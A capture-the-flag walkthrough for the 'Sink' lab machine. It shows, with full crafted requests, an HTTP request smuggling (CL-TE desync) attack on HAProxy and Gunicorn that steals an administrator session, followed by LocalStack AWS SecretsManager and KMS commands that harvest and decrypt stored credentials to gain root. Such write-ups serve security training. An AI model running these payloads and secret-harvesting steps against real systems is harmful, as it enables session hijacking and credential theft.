@@ -1,0 +1,270 @@
+Sink
+
+13th September 2021 / Document No D21.100.131
+Prepared By: MrR3boot
+Machine Author(s): MrR3boot
+Difficulty: Insane
+Classification: Official
+Synopsis
+
+Sink is an insane Linux machine that features an application which is vulnerable to HTTP Desync attack.
+Exploiting this vulnerability gives access to a high privileged user on the application. This privilege gives
+access to Gitea service. Enumeration of repositories lead to a private key leak which can be used to gain a
+foothold on system. Enumerating SecretsManager service reveals credentials which assists in moving
+laterally. System access can be obtained by decrypting a file using the KMS service.
+
+Skills Required
+
+      Enumeration
+      OWASP Top 10
+      Basic AWS Cloud Knowledge
+
+Skills Learned
+
+      HTTP Desync Exploitation
+      AWS CloudWatch
+      AWS SecretsManager
+      AWS KMS
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.200.88 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.129.200.88
+
+Nmap scan reveals that the target server has three ports open. We browse to port 3000.
+Gitea is a self hosted Git service. Registration feature is disabled in this application. Let's browse to the
+Explore page.
+We don't have any public repositories to view. Let's look at Users tab then.
+
+It seems that there are three usernames. It is possible to browse to Organizations .
+
+The orgnization is Sink_Solutions . We note down the usernames and continue further the enumeration
+by browsing to port 5000.
+We've another application running on port 5000 with registration and login features. We register a new
+account and login.
+
+Website has a post written by Administrator which is referring to a DevOps introduction and it has a
+feature to comment on the post. We also find the email of admin@sink.htb .
+Clicking on Delete hyperlink will delete the comments. We also notice a notes feature.
+After creating a note, it is possible to either view or delete it.
+Tests for xss, ssti and sql injections failed on both the comments and notes features. Reviewing the
+response headers we observe that the requests are processed by Gunicorn 20.0.0 .
+Foothold
+
+Gunicorn is a Web Server Gateway Interface (WSGI) HTTP server which is commonly used in web
+application deployments. We also notice a Via header having haproxy . This header is generally being
+added by forward/reverse proxies in order to track the requests and responses from specific client. If we
+send an incomplete request to the proxy server it reveals the version in the response header.
+
+Searching online for known vulnerabilities on this specific version reveals the following reference.
+
+This blogpost explains that HAProxy 1.9.10 version is vulnerable to the HTTP request smuggling
+vulnerability. HAProxy offers Transfer-Encoding header over Content-Length when passing the
+requests to the backend servers. But if we manage to append a vertical tab to it then it processes the
+requests based on the Content-Length header.
+Gunicorn changelog reveals that the chunked encoding support is fixed in 20.0.1 version.
+
+   fixed chunked encoding support to prevent any request smuggling
+   <https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn>_
+In our case it is still supported. So due to the vulnerability in the frontend HAProxy server, the requests are
+processed based on Content-Length header and the backend Gunicorn server prefers Transfer-
+Encoding header. This combination is vulnerable to the CL-TE HTTP Desync.
+The DevOps post is written by user Administrator and we also have an email of admin@sink.htb which
+indicates that maybe the administrator user is present in this application. Assuming that the administrator
+user is performing some actions on the same application, we can perform the request smuggling attack to
+either steal his cookies or to reveal some sensitive information.
+We intercept a request of posting a comment or saving a note and forward it to repeater.
+
+After we encode the vertical tab character.
+   >>> import base64
+   >>> base64.b64encode("\v".encode('utf-8'))
+   b'Cw=='
+
+We then insert Transfer-Encoding header with vertical tab character.
+   Transfer-Encoding: Cw==chunked
+
+Finally we select the Cw== and press ctrl+shit+b to decode the base64 encoded content. The request
+looks like below.
+By default, HTTP connections close after each request. By changing Connection: close to Connection:
+keep-alive we can instruct the server that the coming request requires a HTTP persistent connection and
+the TCP connection should open for multiple requests/responses. Modify the request body as below.
+
+   9
+   msg=test
+   0
+
+Append another POST request:
+
+   POST /comment HTTP/1.1
+   Host: localhost:5000
+   Cookie: lang=en-US; i_like_gitea=5e11bd2da8fe3c35; _csrf=tO_pYCmxOy_mb8pgyHP_Xg-
+   tz6o6MTYzMTUwNzA1MDU3MDE0NTQwOA;session=eyJlbWFpbCI6InRlc3RAc2luay5odGIifQ.YT7WCA.4v33J
+   _0GhKT2-OeU7hEGlXkp2W8
+   Content-Type: application/x-www-form-urlencoded
+   Content-Length: 300
+
+   msg=
+
+The final request looks like below.
+The HAProxy processes the entire request based on Content-Length and forwards it to Gunicorn server.
+Gunicorn processes the request based on Transfer-Encoding header so it splits the request into two
+requests. The first request breaks at 0 .
+
+   POST /comment HTTP/1.1
+   Host: 10.129.200.88:5000
+   User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+   Accept-Language: en-US,en;q=0.5
+   Accept-Encoding: gzip, deflate
+   Content-Type: application/x-www-form-urlencoded
+   Content-Length: 331
+   Origin: http://10.129.200.88:5000
+   DNT: 1
+   Connection: keep-alive
+   Referer: http://10.129.200.88:5000/home
+   Cookie: lang=en-US; i_like_gitea=5e11bd2da8fe3c35; _csrf=tO_pYCmxOy_mb8pgyHP_Xg-
+   tz6o6MTYzMTUwNzA1MDU3MDE0NTQwOA;
+   session=eyJlbWFpbCI6InRlc3RAc2luay5odGIifQ.YT7WCA.4v33J_0GhKT2-OeU7hEGlXkp2W8
+   Upgrade-Insecure-Requests: 1
+   Transfer-Encoding: ·chunked
+
+   8
+   msg=test
+   0
+
+Gunicorn then waits till a packet of length 300 bytes is received. In the meantime if another user hits the
+server then that request will act like body to this POST request and gets saved to comments section. We
+send the request and check the comments.
+We notice that internally a user is deleting the notes. The request though leaks the session of that user. We
+can update the session in the browser and reload the page.
+
+This authenticate us with administrator user access. We navigate to Notes .
+
+We observe that there are three notes saved by admin. Checking each one reveals the below information.
+   Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz
+   Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3
+   Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK\{*L.fB3C
+
+All three subdomains redirect to the main application. Trying these credentials on SSH service with different
+usernames that we've so far unfortunately fails. Dev Node URL credentials work though for gitea login.
+We notice the four repositories available. Navigating to Explore reveals that one of the repo is archived.
+
+Looking at the commits we see in one of the commit the user marcus changing the contents of ec2.php
+file.
+In the same commit we also observe that he accidentally placed .keys folder with SSH private key
+contents.
+
+We copy the key and attempt to login to the SSH as user marcus .
+
+This is indeed successful. User flag can be now found in /home/marcus/user.txt file.
+Lateral Movement
+
+Log_Management repository includes a file named create_logs.php . We review the content of it.
+
+It seems to interact with the AWS CloudWatch Logs service on http://127.0.0.1:4566 endpoint. By
+checking internal services we spot a service running on port 4566.
+
+Amazon CloudWatch is used to monitor, store, and access log files from EC2 instances, AWS CloudTrail, or
+other sources. We also notice that aws and awslocal utilities are installed on the server.
+
+awslocal utility is used to interact with localstack . Localstack is a local AWS cloud stack. It is possible
+to enumerate the CloudWatch Logs by using the awslocal utility. Querying logs requires LogGroup and
+LogStream names. We first though need to find the LogGroup name. This can be achieved by using the
+describe-log-groups command.
+
+   awslocal logs describe-log-groups
+We can find the LogStream name by issuing the below command.
+   awslocal logs describe-log-streams --log-group-name cloudtrail
+
+We now have the information required so we can query the log events.
+   awslocal logs get-log-events --log-group-name cloudtrail --log-stream-name 20201222
+Looking at those events messages we notice some terms like RotateSecret and RestoreSecret .
+Searching online for these terms reveals that they are related to the SecretsManager service.
+
+We can now enumerate the secrets from SecretsManager service by issuing:
+   awslocal secretsmanager list-secrets
+We see there are three secrets. Let's list them all, one by one.
+
+   awslocal secretsmanager get-secret-value --secret-id 'Jenkins Login'
+   awslocal secretsmanager get-secret-value --secret-id 'Sink Panel'
+   awslocal secretsmanager get-secret-value --secret-id 'Jira Support'
+Checking the /home folder we discover that david user is present on the server.
+A password reuse attack for the Jira Support works for david user.
+Privilege Escalation
+
+By further enumerating the home folder of user david it is possible to spot a Projects folder.
+
+It lists servers.enc file in Prod_Deployment subfolder. By running the file linux command we
+understand that there is some binary data and unfortunately by using the xxd command nothing useful
+showed up.
+
+This could be an encrypted file with a specific encryption algorithm. By exploring the Key_Management
+repository we discover a keys.php file. We review its contents.
+This file is interacting with the AWS KMS service. The KMS stands for Key Management Service . This
+service is used for key generation, storage and management. This also helps in encryption or digitally
+signing of data within the applications. Enumerating this service is a step forward to decrypt the
+servers.enc file.
+First we can check if there are any keys present in the KMS service.
+
+   awslocal kms list-keys
+
+Indeed it seems that many keys exist. Before attempting any decryption of the file, we need to find out how
+many keys are in the enabled state.
+   #!/bin/bash
+   for key in `awslocal kms list-keys | grep 'KeyId' | cut -d ':' -f2 | tr -d '",'`
+
+                 do
+                                STATE=`awslocal kms describe-key --key-id $key | grep 'KeyState'| cut -
+
+   d ':' -f2 | tr -d '",'`
+                                echo "$key : $STATE"
+
+                 done
+The above script iterates through the list of keys and runs the describe-key command on each key to
+discover it's state. We save the script and execute it.
+
+We observe that there are only 2 keys enabled. We run the describe-key command on each of them.
+   awslocal kms describe-key --key-id c5217c17-5675-42f7-a6ec-b5aa9b9dbbde
+Based on KeyUsage we can understand that the key is used for digital signing purpose.
+   awslocal kms describe-key --key-id 804125db-bdf1-465a-a058-07fc87c0fad0
+This key is used for encryption and decryption and the EncryptionAlgorithms is also listed. Let's try to
+decrypt the servers.enc file now using one of those algorithms.
+
+   awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --ciphertext-blob
+   fileb://servers.enc --encryption-algorithm RSAES_OAEP_SHA_1 --output text
+
+   awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --ciphertext-blob
+   fileb://servers.enc --encryption-algorithm RSAES_OAEP_SHA_256 --output text
+Finally this is successful and the output contains a base64 formatted data. We decode the base64 content
+and save it to a file.
+
+   echo -n H4sIAAAAAAAAAytOLSp<SNIP>TgL7TAAoAAA= | base64 -d > servers
+Running file command shows that its a gzip compressed data.
+
+We fix the extention and then extract the data.
+   mv servers servers.gz
+   gzip -d servers.gz
+
+This produced a tar archive. We untar the file.
+
+We notice the servers.sig file which probably includes a digital signature of the servers.yml file. Let's
+verify the signature of the file using sign key.
+   awslocal kms verify --key-id c5217c17-5675-42f7-a6ec-b5aa9b9dbbde --message-type RAW --
+   message fileb://servers.yml --signing-algorithm ECDSA_SHA_512 --signature
+   fileb://servers.sig
+
+Signature is successfully verified. Let's view the contents of servers.yml file.
+   server:
+      listenaddr: ""
+      port: 80
+      hosts:
+          - certs.sink.htb
+          - vault.sink.htb
+   defaultuser:
+      name: admin
+      pass: _uezduQ!EY5AHfe2
+
+This includes the credentials for the hosts. Finally we reuse the password for accessing the root user.
+
